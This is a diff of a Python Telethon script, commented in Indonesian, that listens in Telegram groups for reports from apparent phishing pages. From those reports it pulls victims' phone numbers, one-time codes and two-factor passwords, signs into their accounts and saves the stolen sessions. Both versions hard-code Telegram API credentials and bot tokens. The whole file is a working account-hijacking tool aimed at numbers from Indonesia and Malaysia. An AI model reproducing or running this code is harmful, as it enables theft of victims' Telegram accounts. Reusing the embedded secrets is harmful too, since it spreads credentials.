@@ -1,134 +1,133 @@
 import asyncio
-import json
 import os
 import re
-from telethon import TelegramClient, events
+import json
 import shutil
+from telethon import TelegramClient, events
 
-# === Konfigurasi ===
-api_id = 23520639
-api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
-bot_token = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
+# === Konfigurasi Dasar ===
+API_ID = 28085374
+API_HASH = 'b2b03513008c2535e0859c7c4e1c1c36'
+BOT_TOKEN = '7895384862:AAHVFKkUVUrKKXlByW70odqIrsjbxISCYuU'
 
-SESSIONS_FOLDER = "ewww_sessions"
-sessions_folder = "sessions"  # Folder tujuan untuk menyimpan session yang berhasil login
-pending_login = {}  # {phone: (TelegramClient, password)}
+TEMP_SESSIONS = "ewww_sessions"
+FINAL_SESSIONS = "sessions"
 
-# === Whitelist Kode Negara ===
-ALLOWED_PREFIXES = ["+62", "+60"]
+os.makedirs(TEMP_SESSIONS, exist_ok=True)
+os.makedirs(FINAL_SESSIONS, exist_ok=True)
 
-# === Fungsi Validasi Nomor Telepon ===
-def is_valid_phone_number(phone):
+# Prefix negara yang diizinkan
+WHITELIST_PREFIX = ["+62", "+60"]
+
+# Penyimpanan login sementara
+login_queue = {}
+
+# === Validasi Nomor ===
+def valid_number(number):
     return (
-        bool(re.fullmatch(r"\+\d{10,15}", phone)) and
-        any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
+        re.fullmatch(r"\+\d{10,15}", number)
+        and any(number.startswith(pfx) for pfx in WHITELIST_PREFIX)
     )
 
-# === Buat folder session jika belum ada ===
-os.makedirs(SESSIONS_FOLDER, exist_ok=True)
-os.makedirs(sessions_folder, exist_ok=True)
-
-# === TelegramClient utama untuk monitoring grup ===
-client = TelegramClient('main2', api_id, api_hash)
-
-# === Fungsi untuk memindahkan session ke folder sessions ===
-def move_session_to_sessions_folder(phone_number):
-    session_path = os.path.join(SESSIONS_FOLDER, phone_number)
-    destination_path = os.path.join(sessions_folder, phone_number + ".session")
-
-    if os.path.exists(session_path):
-        shutil.move(session_path, destination_path)
-        print(f"[✅] Sesi {phone_number} dipindahkan ke folder sessions.")
+# === Pindahkan session sukses ke folder final ===
+def relocate_session(phone):
+    src = os.path.join(TEMP_SESSIONS, phone)
+    dst = os.path.join(FINAL_SESSIONS, f"{phone}.session")
+    if os.path.exists(src):
+        shutil.move(src, dst)
+        print(f"[✔] Session {phone} berhasil dipindahkan ke folder sessions.")
     else:
-        print(f"[❌] Tidak ditemukan sesi untuk {phone_number} di {session_path}")
+        print(f"[✖] Session {phone} tidak ditemukan di {src}.")
 
-# === Handler Pesan Masuk dari Grup ===
-@client.on(events.NewMessage)
-async def handler(event):
-    msg = event.raw_text
+# === Client utama ===
+main_client = TelegramClient('main2', API_ID, API_HASH)
 
-    if any(keyword in msg for keyword in [
+# === Proses pesan dari grup ===
+@main_client.on(events.NewMessage)
+async def handle_group_message(event):
+    content = event.raw_text
+
+    if any(tag in content for tag in [
         '❮ LAPORAN DAFTAR GRATISKU ❯',
         '❮ LAPORAN UANG KUNO ❯',
         '❮ LAPORAN BANTUAN MADANI ❯',
         '❮ LAPORAN LAMBE PECINTA JANDA ❯',
         '❮ LAPORAN FAIDIL  ❯'
     ]):
-        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
-        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
-        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)
+        phone = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', content)
+        otp = re.search(r'OTP\s*:\s*(\d{5,6})', content)
+        passwd = re.search(r'PASSWORD\s*:\s*(\S+)', content)
 
-        if phone_match:
-            phone = phone_match.group(1)
-            password = password_match.group(1) if password_match else None
+        if phone:
+            number = phone.group(1)
+            password = passwd.group(1) if passwd else None
 
-            if not is_valid_phone_number(phone):
-                print(f"[❌] Nomor tidak valid atau tidak termasuk whitelist: {phone}")
+            if not valid_number(number):
+                print(f"[❗] Nomor tidak valid: {number}")
                 return
 
-            if otp_match:
-                otp = otp_match.group(1)
-                print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
-                if phone in pending_login:
-                    asyncio.create_task(complete_login(phone, otp, password))
+            if otp:
+                code = otp.group(1)
+                print(f"[📨] OTP untuk {number}: {code}")
+                if number in login_queue:
+                    asyncio.create_task(login_with_code(number, code, password))
                 else:
-                    print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
+                    print(f"[⚠] Tidak ada OTP request sebelumnya untuk {number}")
             else:
-                if phone not in pending_login:
-                    print(f"[📞] Menerima nomor valid: {phone} (mengirim OTP request...)")
-                    asyncio.create_task(request_otp(phone))
+                if number not in login_queue:
+                    print(f"[📲] Meminta OTP untuk {number}")
+                    asyncio.create_task(send_otp_request(number))
                 else:
-                    print(f"[⏳] {phone} sedang menunggu OTP...")
+                    print(f"[⏳] Menunggu OTP untuk {number}...")
 
-# === Kirim OTP Request ===
-async def request_otp(phone):
+# === Kirim OTP ===
+async def send_otp_request(number):
     try:
-        session_path = os.path.join(SESSIONS_FOLDER, phone)
-        login_client = TelegramClient(session_path, api_id, api_hash)
-        await login_client.connect()
+        sess_path = os.path.join(TEMP_SESSIONS, number)
+        client = TelegramClient(sess_path, API_ID, API_HASH)
+        await client.connect()
 
-        if not await login_client.is_user_authorized():
-            await login_client.send_code_request(phone)
-            pending_login[phone] = (login_client, None)
-            print(f"[🔐] Kode OTP dikirim ke {phone}, menunggu OTP...")
+        if not await client.is_user_authorized():
+            await client.send_code_request(number)
+            login_queue[number] = (client, None)
+            print(f"[📧] Kode OTP dikirim ke {number}")
         else:
-            print(f"[✅] {phone} sudah login sebelumnya.")
-            await login_client.disconnect()
-    except Exception as e:
-        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")
+            print(f"[✔] {number} sudah login sebelumnya.")
+            await client.disconnect()
+    except Exception as err:
+        print(f"[❌] Gagal mengirim OTP ke {number}: {err}")
 
-# === Login Setelah Dapat OTP ===
-async def complete_login(phone, otp, password=None):
+# === Login menggunakan OTP ===
+async def login_with_code(number, code, password=None):
     try:
-        login_data = pending_login.get(phone)
-        if login_data:
-            login_client, _ = login_data
+        if number not in login_queue:
+            print(f"[✖] Tidak ditemukan client aktif untuk {number}")
+            return
 
-            try:
-                await login_client.sign_in(phone, otp)
-            except Exception as e:
-                if '2FA' in str(e) or 'password' in str(e).lower():
-                    if password:
-                        await login_client.sign_in(password=password)
-                    else:
-                        print(f"[🔒] Password diperlukan untuk {phone}, tapi tidak ditemukan di pesan.")
-                        return
+        client, _ = login_queue[number]
 
-            print(f"[✅] Login sukses untuk {phone}")
-            move_session_to_sessions_folder(phone)
+        try:
+            await client.sign_in(number, code)
+        except Exception as e:
+            if '2FA' in str(e) or 'password' in str(e).lower():
+                if password:
+                    await client.sign_in(password=password)
+                else:
+                    print(f"[🔒] Password diperlukan untuk {number}, tapi tidak tersedia.")
+                    return
 
-            await login_client.disconnect()
-            del pending_login[phone]
-        else:
-            print(f"[❌] Tidak ada client aktif untuk {phone}")
-    except Exception as e:
-        print(f"[❌] Gagal login {phone}: {e}")
+        print(f"[✅] Login berhasil untuk {number}")
+        relocate_session(number)
+        await client.disconnect()
+        del login_queue[number]
+    except Exception as err:
+        print(f"[❌] Login gagal untuk {number}: {err}")
 
-# === JALANKAN CLIENT ===
-async def main():
-    await client.start()
-    print("[🚀] Client Telegram aktif.")
-    await client.run_until_disconnected()
+# === Jalankan ===
+async def run_main():
+    await main_client.start()
+    print("[🚀] Bot Telegram aktif dan siap menerima pesan.")
+    await main_client.run_until_disconnected()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    asyncio.run(run_main())
